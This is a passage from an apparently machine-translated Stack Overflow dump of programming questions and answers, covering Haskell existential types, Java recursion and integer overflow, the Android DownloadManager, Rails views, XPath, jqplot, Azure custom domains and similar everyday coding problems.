data Iteration k1 v1 k3 v3 = forall k2 v2 . Iteration (Mapper k1 v1 k2 v2) (Reducer k2 v2 k3 v3)

data Job k1 v1 k3 v3 = EmptyJob | forall k2 v2 . ConsJob (Iteration k1 v1 k2 v2) (Job k2 v2 k3 v3)

type IterationNumber = Int
data IterationPhase = IterationMapper | IterationReducer

runJobIteration :: Job k1 v1 k2 v2 -> IterationNumber -> IterationPhase -> IO ()
runJobIteration EmptyJob _ _ = return ()
runJobIteration (ConsJob (Iteration m r) _) 0 IterationMapper = runMapper m
runJobIteration (ConsJob (Iteration m r) _) 0 IterationReducer = runReducer r
runJobIteration (ConsJob (Iteration m r) j) i p = runJobIteration j (i-1) p

runMapper :: (Parsable k1, Parsable v1, Showable v2, Showable k2) => Mapper k1 v1 k2 v2 ->   IO ()
runMapper mapper = do
    contents <- getContents
    mapOutput <- mapM (uncurry mapper . parseKeyValue) $ lines contents
    mapM_ putStrLn $ map showKeyValue $ concat mapOutput

runReducer :: (Parsable k1, Parsable v1, Eq k1, Eq v1, Showable v2, Showable k2) =>    Reducer k1 v1 k2 v2 -> IO ()
runReducer reducer = do
    contents <- getContents
    reduceOutput <- mapM (uncurry reducer) $ groupMapOutput $ map parseKeyValue $ lines contents
    mapM_ putStrLn $ map showKeyValue $ concat reduceOutput

parseKeyValue :: (Parsable k, Parsable v) => String -> (k,v)
parseKeyValue = (parse *** parse) . split (== '\t')

split :: (a -> Bool) -> [a] -> ([a], [a])
split p xs = let (group, rest) = break p xs
             in (group, tail rest)

showKeyValue :: (Showable k, Showable v) => (k,v) -> String
showKeyValue (k,v) = showit k ++ "\t" ++ showit v

groupMapOutput :: (Eq k, Eq v) => [(k,v)] -> [(k,[v])]
groupMapOutput kvs = groupMapOutput' kvs []
groupMapOutput' kvs gs
    | kvs == [] = gs
    | otherwise = groupMapOutput' rest (gs ++ [(k, map snd group)])
        where 
            k = fst (head kvs)
            (group, rest) = span ((== k) . fst) kvs 
```

当我尝试加载上述代码时，我总是收到以下错误：

```
No instances for (Showable k4,
                    Showable v4,
                    Parsable v1,
                    Parsable k1)
    arising from a use of `runMapper'
  In the expression: runMapper m
  In an equation for `runJobIteration':
      runJobIteration (ConsJob (Iteration m r) _) 0 IterationMapper
        = runMapper m 
```

我尝试将类型类添加到数据构造函数中，但这似乎不起作用。我还尝试创建隐藏类型的 AnyMapper 数据类型，但这也不起作用。任何人都知道我可以如何优雅地解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T09:48:41.027

好的，我设法通过检查所有函数和数据类型并添加必要的类型约束直到它编译来解决它。主要问题似乎是我需要为不在存在部分中的类型包含类型约束。但是，编译器对这些类型的命名不同，这有点令人困惑。作为参考，以下是最重要的变化。无论如何，我将切换到类型类而不是这些长长的类型约束列表，因为它们非常难以管理。

```
 data Iteration k1 v1 k3 v3 = forall k2 v2 . (Eq k2, Eq v2, Showable k2, Showable v2, Parsable k2, Parsable v2) => Iteration (Mapper k1 v1 k2 v2) (Reducer k2 v2 k3 v3)
data Job k1 v1 k3 v3 = EmptyJob | forall k2 v2 . (Eq k2, Eq v2, Showable k2, Showable v2, Parsable k2, Parsable v2) => ConsJob (Iteration k1 v1 k2 v2) (Job k2 v2 k3 v3)
runJobIteration :: (Parsable k1, Parsable v1, Parsable k2, Parsable v2, Showable k1, Showable v1, Showable k2, Showable v2) => Job k1 v1 k2 v2 -> IterationNumber -> IterationPhase -> IO () 
```

# java - Java：在递归方法中记住上一步的结果

> ID：14469394
> 
> 赞同：1
> 
> 时间：2013-01-22T22:40:10.240
> 
> 标签：java, arrays, recursion, boggle

我正在开发一个 Boggle 游戏，有人告诉我搜索单词的最佳方法是使用递归。我正在尝试使用 searchWord 方法来搜索单词。如果找到第一个字母，则该方法调用自身并删除第一个字母。当长度 == 0（找到单词）或 false（未找到字母）时，该方法返回 true。问题有时令人难以置信，一个“骰子”周围有多次相同的字母......为了解决这个问题，我需要计算那个字母，如果它不止一次，它应该搜索那个字母的下一个出现（搜索同一个词，不丢首字母）。我需要一种方法来记住该字母和多个字母所围绕的字母的索引，以便在找不到字母时可以使用它来检查是否还有其他可能性。既然'

希望大家能帮忙！这是方法：

```
public boolean searchWord(String word, int i, int j) {
    boolean res;
    if (word.length() == 0) {
        res = true;
    } else {
        String theWord = word.toUpperCase();
        int[] indexes = searchLetter(Character.toString(theWord.charAt(0)), i, j);
        if (indexes[0] > -1) {
            res = searchWord(theWord.substring(1), indexes[0], indexes[1]);
        } else if(countLetter(Character.toString(/*The value that has to be memorized*/), /*index 1 that has been memorized*/, /*index 2 that has been memorized*/) > 1) {
            res = searchWord(theWord, i, j);
        } else {
            res = false;
        }
    }
    return res;
} 
```

注意：是的，我使用了奇怪的字符串，因为字符可能是更好的选择，但我可以稍后更改。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T22:50:37.870

原则上，您可以将任何此类值作为附加参数传递。这样，参数/调用堆栈就充当您的堆栈。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T23:30:46.273

目标：查看 Boggle 板上是否存在单词

假设：

*   每个位置（即立方体）每个单词只能使用一次

*   每个字母必须相邻（垂直、水平或对角线）

这是我对使用递归执行此操作的伪代码的尝试（其中，boggle 板是一个 2D 字符数组 - 在调用此方法之前应该已经填充了字符）：

```
// searches for a single occurence of a word on the boggle board
boolean searchWord(String word, char[][] board)
    for each position on the board (x,y)
        boolean[][] visited = new boolean[width][height] // all false
        if (searchWord(x,y,board,visited))
            return true
    return false

// searches a position on the board
boolean searchWord(String word, int x, int y, char[][] board, boolean[][] visited)
    if x and y are valid (0 >= x < width and 0 >= y < height)
        if visited[x][y] == false
            visited[x][y] = true
            if the letter at x,y equals the 1st char of the search word
                if word.length() == 1
                    return true
                else
                    for each surrounding position (x2, y2)
                        if searchWord(word.substring(1),x2,y2,board,visited)
                            return true
    return false 
```

如您所见，递归是寻路（查找令人困惑的单词）的不错选择。您只需要传递当前状态（`visited`在本例中为数组），就可以知道您已经在哪里了。

我已经使用参数来存储状态，但如果你真的需要，你可以使用实例变量。我建议使用参数，因为它符合函数式编程范式，并且不太可能遭受意想不到的副作用。

这里并不需要显式使用堆栈。当值具有`scope`（如 Java 中的局部变量）并且应该以特定顺序访问时，堆栈非常有用，这在这里并没有真正的帮助。仅供参考，通过使用递归，无论如何你都在使用 Java 的调用堆栈，如果你不小心，你可以永远递归，你会得到一个 StackOverflowException ;)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-22T22:47:11.350

只需在您的方法中添加另一个参数。例如，您可以创建一个仅包含字母和 int 的对象。由于Java在进行递归调用时只传递对该对象的引用（但不复制对象本身），所以参数将始终指向同一个对象。您可能想使用 Java 的 pair 类（如果我没记错的话，它是在地图中使用的）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-22T22:43:32.890

您应该重写它以使用堆栈。递归几乎总是用堆栈更好地完成。然后，您可以存储有关上下文的一些信息，并将需要更多处理的内容推送到堆栈上，并在您准备好处理它们时将其弹出。

# android - Android DownloadManager 双重请求和请求中止

> ID：14469396
> 
> 赞同：0
> 
> 时间：2013-01-22T22:40:15.853
> 
> 标签：android, android-download-manager

我正在尝试使下载管理器请求正常工作，但遇到了一个奇怪的错误。这是代码：

```
package com.vsnetworks.vswebkads;

import java.io.File;
import android.net.Uri;
import android.os.Bundle;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.DownloadManager;
import android.app.DownloadManager.Request;
import android.content.Context;
import android.util.Log;

@TargetApi(9)
public class MainActivity extends Activity {

static final String DL_STR = "downloads";

@Override                                                                            
public void onCreate(Bundle savedInstanceState) {

    Log.v("VERS TEST", "1.1");
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    File externalDir = getExternalFilesDir(null);
    externalDir.mkdirs();

    File dlDir = new File(externalDir, MainActivity.DL_STR);
    if (!dlDir.exists())
        dlDir.mkdirs();

    DownloadManager dlManager = (DownloadManager) getApplicationContext().getSystemService(Context.DOWNLOAD_SERVICE);
    Uri uri = Uri.parse("https://www.google.com/images/srpr/logo3w.png");
    //uri = Uri.parse("http://download.thinkbroadband.com/20MB.zip");
    DownloadManager.Request request = new Request(uri);
    request.setAllowedNetworkTypes(Request.NETWORK_WIFI);
    request.setDestinationInExternalFilesDir(getApplicationContext(), null, "downloads/test.png");
    request.setTitle("test");
    dlManager.enqueue(request);
}
} 
```

有趣的是，如果我取消注释第二个 uri = 行，下载效果很好，文件最终在目录中。这让我认为是我试图通过 SSL 下载导致问题。但是，根据这两个线程，下载管理器支持 ssl（在第一个的注释中）：

[Android 下载管理器和 SSL (https)](https://stackoverflow.com/questions/8106155/android-downloadmanager-and-ssl-https)

[android2.3 下载管理器](https://stackoverflow.com/questions/14212339/android2-3-downloadmanager)

我似乎也没有收到任何错误，告诉我下载管理器只能与第二个链接中的 http 一起使用。这是我看到的错误：

```
01-22 17:23:42.385: I/DownloadManager(1061): Initiating request for download 4068
01-22 17:23:42.905: I/DownloadManager(1061): Initiating request for download 4068
01-22 17:23:42.905: W/DownloadManager(1061): Aborting request for download 4068: Trying to resume a download that can't be resumed
01-22 17:23:42.905: D/DownloadManager(1061): setupDestinationFile() unable to resume download, deleting /storage/sdcard0/Android/data/com.vsnetworks.vswebkads/files/downloads/test.png
01-22 17:23:42.915: D/DownloadManager(1061): cleanupDestination() deleting /storage/sdcard0/Android/data/com.vsnetworks.vswebkads/files/downloads/test.png 
```

我今天刚刚在我的平板电脑上更新了 android，它的版本是 4.1.1，所以我认为这不是版本问题。

那么，我可以使用 https 进行下载管理器请求吗？如果可以，这是正确的方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-31T16:15:32.417

在这种情况下，错误似乎与设备有关。当我们将测试切换到 nexus 10 时，代码可以正常工作并且没有出现此错误。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-01-12T16:08:33.987

检查您的服务器日志，有时 DownloadManager 会启动部分下载请求（这会导致误导性的双重日志输出“Initiating request for download”。您的服务器必须正确处理此请求，否则您会收到此错误。请参阅我对这个问题的回答： [无法继续下载](https://stackoverflow.com/questions/20776833/cant-resume-download/21076744#21076744)

# android - 将数据从 Android 应用程序导出到台式 PC 的最便捷方法是什么

> ID：14469399
> 
> 赞同：2
> 
> 时间：2013-01-22T22:40:26.450
> 
> 标签：android, export, desktop

我想知道是否有**最佳实践**（或首选方式）将 Android 应用程序中生成的数据导出到台式电脑！？

场景如下：我的 Android 应用程序收集传感器数据，我想将其导出（例如，作为 CSV 文件）以供以后在台式 PC 上进行分析（假设它运行 Windows）。一旦数据导出，我就不再关心它了；特别是我不想再次导入它。唯一的限制是普通 PC 用户（对 Android 的文件系统、云存储等没有深入了解）应该能够执行此任务。

在我看来，这是一项常见的任务，我正在寻找一种简单的方法（从用户的角度）来实现它。如果可能，该解决方案不需要实现我自己的云服务或桌面客户端。请注意，我不是要求提供技术细节，而是要求解决我的问题的一般方法。

我想到了一些直接的解决方案，但我不确定利弊。

*   将文件放在 SD 磁盘上并让用户复制它。
*   将数据上传到云存储，例如 Google 驱动器。
*   通过电子邮件发送数据（尽管由于潜在的巨大文件大小，这可能不是一个好主意）。

一种理想的方式似乎是这里描述的：[如何将文本从 iOS 应用程序导出到桌面 PC？](https://stackoverflow.com/questions/7019813/how-do-i-export-text-from-ios-application-to-desktop-pc)不幸的是，这是苹果...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T23:08:00.043

你已经给出了很好的建议。我倾向于像其他应用程序一样拥有“共享”按钮，并且根据设备上安装的应用程序有多种选择。特别是可以选择将文件保存到 sdcard，以便用户可以使用 USB 电缆将其复制到 PC，以及通过邮件发送、与 Dropbox 共享（如果可用）等其他选择。

![在此处输入图像描述](../Images/1eb3f6a6f49325a30c0952b22e6b5148.png)

以上可以通过使用带有动作 ACTION_SEND 的意图来完成，[Android 将负责显示可用的选项](http://developer.android.com/training/sharing/send.html)。对于“复制到 sdcard”选项，也许您可​​以编写一个作为应用程序一部分的活动，该活动也侦听 ACTION_SEND 操作，如果选中，只需将文件复制到 sdcard。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-23T03:04:24.927

最好是通过 FTP 上传到后端。无需用户干预，一次文件生成FTP上传。只需确保在后端您的 FTP 服务器正在运行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T22:44:56.343

如果您使用内置的 sqlite 数据库服务，用户只需将文件复制到他们的 PC。从那里桌面用户只需要在 sqlite 查看器中打开它。

除此之外，我认为您需要将数据放入文本文件并自行格式化。然后用户可以将其复制到他们的 PC 上。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-05-08T16:43:06.233

我遇到了完全相同的问题，我最终将 .csv 文件上传到谷歌驱动器，然后将其转换为谷歌电子表格。这使得用它生成一些图表或将它们导出以供以后在 excel 中使用非常方便。

如果有人有兴趣 [https://github.com/philiiiiiipp/Spreadsheet-to-google-drive](https://github.com/philiiiiiipp/Spreadsheet-to-google-drive)

# ruby-on-rails-3 - **更新** Rails 3 中的方法错误

> ID：14469400
> 
> 赞同：0
> 
> 时间：2013-01-22T22:40:26.917
> 
> 标签：ruby-on-rails-3, syntax, associations, erb

我需要一种方法来确定用户是否有项目。

我的用户模型有一个`has_one :project`声明

和 Project 模型作为`belongs_to :User`声明。

`app/views/users/show.html.erb`我想使用此逻辑在我的文件中设置切换状态...

```
<div id="snapshot">
    <h2>Project Snapshot</h2>
    <% if has_project? %>
        <% render 'projects/project_overview' %>
    <% else %>
        <% render 'projects/no_project' %>
    <% end %>
</div> 
```

ProjectsHelper 方法的代码是...

```
<% def has_project %>
  <% current_user.project(params[:user_id]) %>
<% end %> 
```

我需要知道为什么这没有呈现任何一个选项？视图显示没有错误。

**问题已从原始更新。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:57:51.557

删除语句中的等号。

您的代码有：

```
<%= if has_project? %> 
```

应该：

```
<% if has_project? %> 
```

### 编辑

尝试将您的更改`<% if has_project? %>`为`<% if current_user.project %>`（因为您似乎想要做的只是查询当前用户是否有关联的项目）并删除辅助方法。请参阅[ActiveRecord::Associations::ClassMethods 上的 Rails API 条目，](http://api.rubyonrails.org/classes/ActiveRecord/Associations/ClassMethods.html)以了解创建关联时提供了哪些方法。

# java - 序列中的递归

> ID：14469401
> 
> 赞同：1
> 
> 时间：2013-01-22T22:40:30.770
> 
> 标签：java, loops, integer

我正在尝试使我的 Hailstone 序列输出由于 int 的限制而无法计算的最小整数，但由于某种原因它仍然无法正常工作。关于为什么不这样做的任何想法将不胜感激。

```
 public static void main(String[] args) {
        int x=2; 
        int count = x;
        //Collatz Conjecture computation
        while (true)
        {   x=2; 
            x =count;
            while (x != 1)
            {   
                if (x % 2 == 0)
                    x = x / 2;
                if (x % 2 == 1)
                    x = x * 3 + 1;
                if (x < 0)
                {   System.out.print("The integer " + count + " cannot have its Hailstone sequence computed using int variables. ");
                    return;
                }
            }
            count ++;
        }
    } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T22:46:32.473

看看你实际上在做什么。您的打印语句位于带有条件的 if 语句中`x < 0`，但*绝不*`x`会小于。您正在执行的两个操作是：和。这些都不能将积极变成消极。*`0``x``x = x / 2``x = x * 3 + 1`*

 ** * *

***编辑：***现在我明白这`x < 0`是为了测试 int 溢出。请记住，不能保证会发生这种情况，序列可能会陷入一个循环（并且可能会在大多数初始`x`，因为一旦序列到达你就会有这样一个循环`1`），尽管如果发生这种情况你的`while`-loop会中断，你不会得到任何输出。另一种选择（正如我在评论中指出的那样）是`x`类型为`long`(ie`long x = ...`) 并让 if-condition 为`x > Integer.MAX_VALUE`。

* * *

另外，看看这个：

```
int n = Integer.MAX_VALUE;
System.out.println(3 * n + 1); 
```

```
2147483646

```

显然存在溢出，但结果`3*n + 1`仍然是肯定的。

* * *

最后，您的前两个*语句*似乎有问题`if`（第二个应该是一个`else if`），如另一个答案所示。为了完整起见，我只是提到它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-22T22:57:07.367

目前，您`Hailstone sequence`将达到一个[无休止的序列](http://plus.maths.org/content/mathematical-mysteries-hailstone-sequences)，`4, 2, 1, 4, 2, 1, ...`因为您拥有多个`if's`而不是`if-else`.

您应该将您的设置更改`if's`为： -

```
if (x % 2 == 0)
    x = x / 2;
else
    x = x * 3 + 1;
if (x < 0) {   
    System.out.print("The integer " + count + " cannot have its Hailstone sequence computed using int variables. ");
    return;
} 
```

* * *

**那么，问题是什么？**

如果您使用 just `if's`，那么在某个时间点，您`x`将成为`1`由于第一个`if`条件。

因此，使用`x = 1`，第二个`if`将被执行，`x`现在将变为 - `1 * 3 + 1`= `4`。然后while循环继续。再次，`x`变为`2`( **1st`if`** )，然后再次`while`循环继续 ( **As`2nd if`现在不满足。`2 % 2 != 1`** )，然后`x`变为`1`( **1st`if`** )，然后变为`4`( **2nd`if`** )，依此类推。这个问题出现了，因为你的两个`if`块每次都被执行。

* * *

只是为了完成答案，我认为你甚至不需要最后一个条件 - `x < 0`。您的 while 循环将自动中断 when `x becomes 1`。这必须是结束序列的唯一条件。因为，一旦你从 value 开始`1`，你就会进入那个致命的序列。所以，只需删除`if (x < 0)`部分。**不需要。**

所以，你应该只使用： -

```
if (x % 2 == 0)
    x = x / 2;
else
    x = x * 3 + 1; 
```

在你的`inner`时候。*

# python - 禁用谷歌应用引擎开发服务器的沙盒以替代 bash 脚本/结构

> ID：14469403
> 
> 赞同：0
> 
> 时间：2013-01-22T22:40:41.870
> 
> 标签：python, google-app-engine, fabric, webapp2

我想在我的本地计算机上创建一个网站，该网站具有以下选项：“创建文件”、“zip 文件夹”等。

当在本地网站上单击此类超链接时，webhandler 将运行诸如 open("new-file", 'w') 等命令。

我想主要使用该网站来控制我的 Google App Engine 项目（而不是使用 bash 脚本或[fabric](http://docs.fabfile.org/en/1.5/) .

也许 Google App Engine / Webapp2 不适合这样的任务，但它让新手不必学习多个框架。

查看[devserver](https://developers.google.com/appengine/docs/python/tools/devserver)的文档，它说

> 模拟环境强制执行一些沙盒限制，例如受限系统功能和 Python 模块导入

但没有迹象表明可以禁用沙盒。（例如，我什至无法读取静态文件）。

A）有没有办法禁用沙盒

B）有没有更好的方法来做我正在考虑尝试做的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:53:00.513

你真的需要 GAE 跑步者吗？

您可以在没有 GAE 运行程序的情况下直接运行您的 main.py（或任何您的入口点）。如果您正在使用 GAE 资源、存根等，那么您只需在您的环境路径中设置它们（即 site-packages/gae.pth，定义在哪里可以找到 GAE 模块）。

就个人而言，出于开发目的，我总是直接运行应用程序，`python main.py`这样我就可以闯入调试器等。

说了这么多，如果您希望在每个人的本地文件系统上控制您的 GAE 项目，我可能会编写一个命令行实用程序。您不仅不必乱用 Web 框架（没必要，恕我直言），而且您实际上可以使它们自动化，这可能是非常有益的（如果对某些人来说不是硬性要求的话）。

此外，让一个 Web 应用程序运行 localhost 只是为了做本地系统管理员的工作，这对我来说似乎有点奇怪。

# javascript - 条太短，不再可见

> ID：14469405
> 
> 赞同：2
> 
> 时间：2013-01-22T22:40:48.617
> 
> 标签：javascript, jquery, jquery-plugins, jqplot

所以我有这个带有 jqplot 的图表

![jqplot](../Images/1e41dcff51876eb512a524177322d3d0.png)

如果您仔细观察，您会发现在 4 和 5 下实际上有要显示的数据，但是条形太短，无法显示数字标签。我有悬停文本，但栏也太小，鼠标无法注册。在 3 之下，实际上在红色和绿色之间还有另一个条，但它也太小而无法显示。

在这种情况下我该怎么办？有什么建议么？

我有几个想法，但不知道如何实现：

*   仅当条形比最高的条小一定百分比时，才在每个条形的旁边/顶部显示数字标签。

*   当鼠标在给定列中时显示悬停文本，而不仅仅是在栏本身上。此悬停文本将显示所有 3 种颜色的数据，而不仅仅是一种颜色。

谢谢！

**编辑：**

我通过编写自定义荧光笔类让悬停文本显示所有 3 种颜色

```
highlighter: {
show: true,
...
tooltipContentEditor:tooltipContentEditor,
}
...
function tooltipContentEditor(str, seriesIndex, pointIndex, plot) {
    var data1 = plot.data[2][pointIndex];
    var data2 = plot.data[1][pointIndex];
    var data3 = plot.data[0][pointIndex];
    var value = data1 + "-" + data2 + "-" + data3;
    return value;
} 
```

当然，这仅适用于每个条形图始终有 3 种颜色的情况，适用于我，所以我现在正在使用。现在我需要弄清楚当条太小时如何让荧光笔更容易显示。

**编辑2：**

我想出了如何让打火机显示出来。

1.  创建一个虚拟系列，我将其设置为给定列和最高列之间的差异

2.  将颜色更改为 rgb 透明，去除阴影，去除高光和其他任何东西。

3.  在将鼠标悬停在不可见栏或它下方的任何栏上时，它现在将显示完整的统计数据，耶！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-24T03:19:32.620

不可见的数据系列听起来很骇人听闻，更不用说现在用户将鼠标放在这个空间时会得到不一致的反馈，这将是一个可变实体

这听起来像是使用图例的好时机，然后在图例的项目上放置一个处理程序，触发该相关系列的悬停

```
var $l = $('.jqplot-table-legend');
$l.on('mouseenter', function(e){
var $this = $(this),
    i = $this.index(),
    l = $l.length;
    // now call your custom highlight function or trigger the hover using relevant indices
})
.on('mouseleave', function(e){ 
    // hide visible tooltips
}); 
```

ps hover 已弃用，请不要再使用它

# rtc - 在 RTC 源代码控制中应该删除流

> ID：14469408
> 
> 赞同：0
> 
> 时间：2013-01-22T22:41:14.037
> 
> 标签：rtc

鉴于 RTC 流是“分支”等价物，您是否应该允许它们在不再被积极使用后被删除（通过将它们移动到另一个流来保留任何快照）？

我目前的想法是，他们可以——保持工作区域更整洁。因此，如果一种产品有多个流，例如我可以这样做：

```
Stream DevEng [delete]
Stream IntEng [delete]
Stream FixEng [delete]
Stream RelEng [Keep] 
```

因为您唯一失去的是查询流以查看它是否每个都看到特定组件基线的能力。

还有其他负面影响吗？你有什么政策？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:49:17.323

另一种选择是重命名和重用。
但删除是一个可行的选择。

在任何情况下，这意味着基线和快照没有紧密链接到流（可以随时重命名或删除）。
因此，重要的是要充分*命名*所述基线和快照，以便记住它们的用途。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-23T01:09:22.507

我一直试图弄清楚流“不再被积极使用”意味着什么，除非它是一个临时功能流并且工作已合并回开发流。我能想到的唯一其他选择是产品已经完成（或死亡）并且永远不会看到未来的发展。

一般来说，我更喜欢删除——如果你真的完成了，那就让它消失吧。但是，如果我已经“完成”了流，但不是其中的东西，我会认为自己没有完成流并保留它。如果您希望它摆脱更多当前的方式，也许可以重命名它。

# xml - XPath 选择具有不同名称的同一级别节点

> ID：14469414
> 
> 赞同：1
> 
> 时间：2013-01-22T22:41:36.273
> 
> 标签：xml, xpath

我在这个 XML 上做出了不同的选择，但对于大多数人来说，我不确定我是否完成了最简单的解决方案，并且对于其中两个我无法提供有效的解决方案。

```
<?xml version="1.0" ?>
<!DOCTYPE list[
<!ELEMENT list(man|woman)*>
<!ELEMENT man(sons,daughters)>
<!ATTLIST man name CDATA #REQUIRED>
<!ELEMENT man(sons,daughters)>
<!ATTLIST woman name CDATA #REQUIRED>
<!ELEMENT sons(man)*>
<!ELEMENT daughters(woman)*>

<list>
    <man name="Jean-Bernard">
        <sons>
            <man name="Marc-Antoine"/>
        </sons>
        <daughters>
            <woman name="Marie-Jeanne">
                <sons/>
                <daughters>
                    <woman name="Anne-Sophie"/>
                </daughters>
            </woman>
            <woman name="Rose-Marie">
                <daughters>
                    <woman name="Marie-Cécile"/>
                </daughters>
            </woman>
        </daughters>
    </man>
    <woman name="Marie-Jeanne">
        <sons>
            <man name="Ghislain-Auguste">
                <sons/>
            </man>  
        </sons>
        <daughters>
            <woman name="Rita-Lise">
            <sons>
                <man name="Alain-Luc"/>
                <man name="Jules-Edouard"/>
            </sons>
            </woman>
        </daughters>
    </woman>
</list> 
```

我做了什么 ：

*   选择所有女性：`//woman`
*   选择所有名为“Marie Jeanne”的女性：`//woman[@name='Marie-Jeanne']`
*   选择名称中包含“Marie”的所有女性：`//woman[contains(@name,Marie)]`

我做了什么，但这并不准确，或者我认为它可以更好：

*   选择所有至少有 2 个孩子的女性或男性：`//*[sum(count(sons/man), count(daughters/woman)) >= 2]`
*   选择所有祖父母的女性或男性：我完全被这个困住了，我看不出我怎么能在这么多未知的情况下选择。在我看来是这样的：`//*/*/*/*`。. . 我不明白如何开始。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-23T01:52:06.883

> 选择所有至少有 2 个孩子的女性或男性：

```
//*[(self::man or self::woman) and count(*/*) > 1] 
```

* * *

> 选择所有祖父母的女性或男性

```
//*[(self::man or self::woman) and */*/*/*] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T22:52:09.030

为了更容易选择所有祖父母的女性或男性，您可以使用“自我”声明性[XPath 来选择多个标签](https://stackoverflow.com/questions/721928/xpath-to-select-multiple-tags)：

```
//*[count(*[self::sons or self::daughters]/*[self::man or self::woman]/*[self::sons or self::daughters]/*[self::man or self::woman]) >= 1] 
```

# java - 按下返回/回车时的java jface触发事件

> ID：14469419
> 
> 赞同：0
> 
> 时间：2013-01-22T22:41:48.237
> 
> 标签：java, swing, jface, key-events

感谢您之前提供的所有帮助。

我想要做的是当按下回车按钮时触发事件。这是我写的代码

```
 txtGolfName = new Text(container, SWT.BORDER);
    txtGolfName.addKeyListener(new KeyAdapter() {
    @Override
    public void keyReleased(KeyEvent e) {
        for(int index = 0; index < gcName.length(); index++)
            if((txtGolfName.getText()).charAt(index) == '\r')
                System.out.println("Success");
            else
                System.out.println("Not Yet");
        }
    });
    txtGolfName.setBounds(180, 90, 300, 25); 
```

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-23T11:44:43.827

Just check `keyCode` of the event:

```
public void keyReleased(KeyEvent e) {
    if (e.keyCode == SWT.CR)
            System.out.println("Success");
        else
            System.out.println("Not Yet");
    }
} 
```

# azure - Azure 网站添加自定义域后返回 404 错误

> ID：14469422
> 
> 赞同：24
> 
> 时间：2013-01-22T22:42:10.347
> 
> 标签：azure, http-status-code-404

我正在使用以共享模式托管的 Azure 网站。在完成添加自定义域的过程后，我在浏览 www.mydomain.com 时似乎收到了 404

当我使用 *.azurewebsites.net 地址浏览我的网站时，它会完美呈现。我还打开了所有可用的日志记录，在网络日志中看不到 404 错误或任何其他问题迹象。

要配置自定义域名，我按照[此](http://www.windowsazure.com/en-us/develop/net/common-tasks/custom-dns-web-site/)页面上的说明进行操作，包括将 CNAME 记录设置为 awverify.mysite.com 并将 A 记录设置为门户中提供的 IP 地址。

我知道还有其他关于 SO 的问题，例如[this](https://stackoverflow.com/questions/11994042/azure-website-cname-and-404)或[this](https://stackoverflow.com/questions/13396261/custom-domains-on-azure-websites-preview-not-working-even-after-upgrade-to-shar)，但没有一个提供适合我的 http 404 问题的答案。此外，关于 SO 的许多问题似乎已经过时，并不是说 azure 网站支持共享模式下的域名（我相信）

干杯抢

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2013-01-23T08:38:05.080

上床睡觉并在早上再看一眼的久经考验的方法似乎对我有用；）（这意味着事实证明这是我自己的愚蠢）

**我只在 azure 门户中添加了“mydomain.com”，还需要添加“www.mydomain.com”。**

我可以发誓，我在门户中看到了一些帮助文本，说域应该以这种格式输入。哦，没关系。我希望这可以帮助其他有同样错误的人。

# java - Java中哈希集合中的可变对象？

> ID：14469423
> 
> 赞同：0
> 
> 时间：2013-01-22T22:42:20.423
> 
> 标签：java, hashmap, immutability, hashcode

> **可能重复：**
> [可变哈希映射键是一种危险的做法吗？](https://stackoverflow.com/questions/7842049/are-mutable-hashmap-keys-a-dangerous-practice)

如果在不使用任何 hashmap API 的情况下修改 hashtable 中的可变对象会发生什么

hashmap 中的对象有变化吗？. 它是否因为它的价值发生了变化而丢失了？

它究竟是如何工作的？

谢谢！

# jquery - SimpleModal JQuery HTML 代码

> ID：14469432
> 
> 赞同：0
> 
> 时间：2013-01-22T22:43:18.647
> 
> 标签：jquery, html, css, simplemodal

我正在使用简单的模态 JQuery 插件在我的 HTML 网站上显示一个对话框。它运作良好，但现在我想在同一页面上显示两个或更多单独的对话框。

这可能吗？

我将演示下载中的代码与 JQuery 调用和 css 文件一起使用。

```
<div id='container'>
<div id='content'>
<div id='basic-modal'>
<a href='#' class='basic'><img src="images/BlueButtonAccess.png" alt="Access Atatement" id="Image4" onmouseover="MM_swapImage('Image4','','images/BlueButtonAccess2.png',1)" onmouseout="MM_swapImgRestore()" /></a></div>           
<!-- modal content -->
<div id="basic-modal-content">
<div id="simplemodal-header">
<h3>Hill House Access Statement </h3>
</div>          
<div id="iframebox"><iframe src="Access Statement iframe.htm" style="background-color: #3D4049;"width="780" height="476" align="left" frameborder="no" marginheight="0px" scrolling="vertical" ></iframe>
</div>
</div>
<!-- preload the images -->
<div style='display:none'>
<img src='images/CloseButton2.png' alt='' id="Image6" onmouseover="MM_swapImage('Image6','','images/CloseButton.png',1)" onmouseout="MM_swapImgRestore()" />            
</div>
</div>

</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T02:20:07.660

看看引导程序。他们提供此功能（无需大量工作）。这是您正在谈论的内容的直接链接 - [http://twitter.github.com/bootstrap/javascript.html#modals](http://twitter.github.com/bootstrap/javascript.html#modals)

# java - 小程序弹出窗口在对话框外获得一个悬停的警告图标

> ID：14469438
> 
> 赞同：2
> 
> 时间：2013-01-22T22:43:47.593
> 
> 标签：java, firefox, applet

